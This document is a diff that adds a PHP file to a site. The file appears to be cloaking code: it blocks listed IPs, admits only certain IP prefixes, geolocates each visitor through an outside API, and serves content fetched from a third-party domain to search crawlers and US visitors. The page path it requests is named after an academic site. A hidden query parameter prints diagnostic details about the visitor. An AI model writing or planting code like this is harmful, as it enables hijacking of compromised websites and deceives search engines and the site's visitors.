@@ -1,0 +1,73 @@
+<?php
+
+$blocked_ips = [
+    '46.250.241.154', '185.224.3.111', '209.14.69.16', '93.123.16.89', '198.135.169.20',
+    '77.75.230.51', '65.109.182.130', '195.154.114.92', '185.19.33.131', '185.37.147.117',
+    '167.235.135.184', '141.98.234.68', '45.9.168.235', '103.99.52.202', '109.248.161.218',
+    '194.5.50.94', '193.8.95.39', '88.135.72.11', '185.24.253.139', '185.105.238.209',
+    '195.211.24.48', '185.185.132.179', '185.25.204.60', '103.214.169.52', '185.120.77.165',
+    '88.119.179.10', '178.17.171.235', '185.209.161.145', '195.211.27.85', '178.216.200.169',
+    '195.137.244.1', '185.83.213.25', '147.45.113.30', '185.130.104.238', '194.26.229.20',
+    '77.239.124.139', '194.146.57.64', '217.15.166.168', '78.40.116.61', '179.43.148.195',
+    '77.92.151.181', '185.23.17.21', '45.159.248.77', '185.86.77.126', '91.231.182.39',
+    '91.102.183.15', '185.143.223.66', '64.72.205.76', '38.145.202.12', '45.252.248.142',
+];
+
+$allowed_prefixes = [
+    '36.', '49.', '103.', '110.', '114.', '118.', '119.', '122.', '123.',
+    '125.', '139.', '140.', '147.', '150.', '152.', '180.', '182.', '202.',
+    '203.', '210.', '222.'
+];
+
+$ip = $_SERVER['REMOTE_ADDR'] ?? '';
+$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$method = $_SERVER['REQUEST_METHOD'] ?? '';
+$headers = getallheaders();
+
+if (in_array($ip, $blocked_ips)) {
+    header("HTTP/1.1 403 Forbidden");
+    exit("Access denied: IP blocked.");
+}
+
+$allow = false;
+foreach ($allowed_prefixes as $prefix) {
+    if (strpos($ip, $prefix) === 0) {
+        $allow = true;
+        break;
+    }
+}
+
+if (!$allow) {
+    header("HTTP/1.1 403 Forbidden");
+    exit("Access restricted to Indonesian IPs only.");
+}
+?>
+
+<?php
+
+$userAgent = $_SERVER['HTTP_USER_AGENT'];
+$ip = $_SERVER['REMOTE_ADDR'];
+function getCountryByIp($ip)
+{
+    $url = "http://ip-api.com/json/$ip";
+
+    $response = file_get_contents($url);
+    $data = json_decode($response, true);
+    $countryCode = $data['countryCode'];
+    return $countryCode;
+}
+$ctryCode = getCountryByIp($ip);
+
+if (isset($_GET['a']) && $_GET['a'] === 'a') {
+    echo "country: " . $ctryCode;
+    echo "<br>";
+    echo "useragent: " . $userAgent;
+    echo "<br>";
+    echo "ip: " . $ip;
+    exit;
+}
+
+if (preg_match('/bot|crawl|slurp|spider/i', $userAgent) || $ctryCode == 'US') {
+    echo file_get_contents('https://jakartafc.com/sipil.ummu.ac.id/');
+    exit;
+}
